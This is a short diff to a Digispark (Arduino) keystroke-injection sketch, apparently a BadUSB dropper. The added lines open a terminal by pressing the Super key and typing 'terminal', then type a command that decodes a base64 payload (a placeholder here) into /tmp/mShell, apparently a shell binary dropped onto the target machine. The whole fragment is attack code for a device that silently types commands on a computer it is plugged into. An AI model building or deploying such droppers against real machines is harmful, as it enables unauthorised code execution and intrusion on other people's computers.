@@ -2,11 +2,17 @@
 
 void setup() {
 DigiKeyboard.sendKeyStroke(0); 
-DigiKeyboard.delay(500);
-DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT + MOD_ALT_LEFT);
-DigiKeyboard.delay(1000);
+delay(200);
+DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); 
+delay(300);
 
-DigiKeyboard.print("echo 'GENERATED BASE 64 CODE GOES IN HERE'/+E= | base64 --decode &gt; /tmp/mShell");
+DigiKeyboard.print("terminal"); // Program to run
+delay(1000);
+
+DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+// Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
+delay(1000);
+DigiKeyboard.print("echo Base64_goes_here/+E= | base64 --decode > /tmp/mShell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 
